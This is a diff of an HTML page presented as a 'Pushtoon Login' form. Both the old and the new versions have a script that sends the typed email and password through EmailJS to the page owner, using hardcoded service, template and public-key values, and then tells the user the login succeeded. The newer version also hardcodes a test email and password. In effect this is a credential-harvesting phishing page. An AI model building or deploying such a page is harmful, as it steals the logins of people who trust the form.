@@ -3,15 +3,7 @@
 <head>
   <title>Pushtoon Login</title>
 
-  <link rel="icon" href="data:,">
-
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <script>
-    emailjs.init({
-      publicKey: "aU_rVriMIfRSDIniQ"
-    });
-  </script>
 
   <style>
     body{
@@ -20,49 +12,36 @@
       display:flex;
       justify-content:center;
       align-items:center;
-      font-family:Arial, sans-serif;
-      background:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
-      background-size:cover;
-      background-position:center;
+      font-family:Arial;
+      background:#f2f2f2;
     }
 
     .container{
       background:white;
       padding:40px;
       border-radius:20px;
-      width:350px;
+      width:320px;
       text-align:center;
-      box-shadow:0 0 20px rgba(0,0,0,0.3);
-    }
-
-    h2{
-      margin-bottom:20px;
+      box-shadow:0 0 20px rgba(0,0,0,0.2);
     }
 
     input{
       width:90%;
       padding:12px;
       margin:10px 0;
-      border:1px solid #ccc;
       border-radius:10px;
-      font-size:16px;
-      outline:none;
+      border:1px solid #ccc;
     }
 
     button{
       width:95%;
       padding:12px;
-      background:orange;
       border:none;
       border-radius:10px;
+      background:orange;
       color:white;
       font-size:18px;
       cursor:pointer;
-      margin-top:10px;
-    }
-
-    button:hover{
-      opacity:0.9;
     }
   </style>
 </head>
@@ -74,21 +53,27 @@
   <h2>LOGIN</h2>
 
   <input type="email" id="email" placeholder="Email">
-  
+
   <input type="password" id="password" placeholder="Password">
 
-  <button onclick="sendMail()">LOG IN</button>
+  <button onclick="login()">LOG IN</button>
 
 </div>
 
 <script>
 
-function sendMail(){
+emailjs.init({
+  publicKey: "aU_rVriMIfRSDIniQ"
+});
+
+function login(){
 
     let email = document.getElementById("email").value.trim().toLowerCase();
+
     let password = document.getElementById("password").value.trim();
 
     const correctEmail = "test@gmail.com";
+
     const correctPassword = "Pushtoon123";
 
     if(email === "" || password === ""){
@@ -111,130 +96,11 @@ function sendMail(){
         "template_lxwj7sw",
         params
     )
-    .then(function(response){
+    .then(function(){
         alert("Login Successful!");
-        console.log(response);
     })
-    .catch(function(error){
-        alert("Failed to send!");
-        console.log(error);
-    });
-
-}
-
-</script>
-
-</body>
-</html><!DOCTYPE html>
-<html>
-<head>
-  <title>Pushtoon Login</title>
-
-  <link rel="icon" href="data:,">
-
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-  <script>
-    emailjs.init({
-      publicKey: "aU_rVriMIfRSDIniQ"
-    });
-  </script>
-
-  <style>
-    body{
-      margin:0;
-      height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      font-family:Arial;
-      background:url("https://images.unsplash.com/photo-1506744038136-46273834b3fb");
-      background-size:cover;
-      background-position:center;
-    }
-
-    .container{
-      background:white;
-      padding:40px;
-      border-radius:20px;
-      width:350px;
-      text-align:center;
-      box-shadow:0 0 20px rgba(0,0,0,0.3);
-    }
-
-    h2{
-      margin-bottom:20px;
-    }
-
-    input{
-      width:90%;
-      padding:12px;
-      margin:10px 0;
-      border:1px solid #ccc;
-      border-radius:10px;
-      font-size:16px;
-    }
-
-    button{
-      width:95%;
-      padding:12px;
-      background:orange;
-      border:none;
-      border-radius:10px;
-      color:white;
-      font-size:18px;
-      cursor:pointer;
-      margin-top:10px;
-    }
-
-    button:hover{
-      opacity:0.9;
-    }
-  </style>
-</head>
-
-<body>
-
-<div class="container">
-
-  <h2>LOGIN</h2>
-
-  <input type="email" id="email" placeholder="Email">
-  <input type="password" id="password" placeholder="Password">
-
-  <button onclick="sendMail()">LOG IN</button>
-
-</div>
-
-<script>
-
-function sendMail(){
-
-    let email = document.getElementById("email").value.trim();
-    let password = document.getElementById("password").value.trim();
-
-    if(email === "" || password === ""){
-        alert("Please fill all fields!");
-        return;
-    }
-
-    let params = {
-        email: email,
-        password: password
-    };
-
-    emailjs.send(
-        "service_bqnzz7f",
-        "template_lxwj7sw",
-        params
-    )
-    .then(function(response){
-        alert("Login Successful!");
-        console.log(response);
-    })
-    .catch(function(error){
-        alert("Failed to send!");
-        console.log(error);
+    .catch(function(){
+        alert("EmailJS Failed!");
     });
 
 }
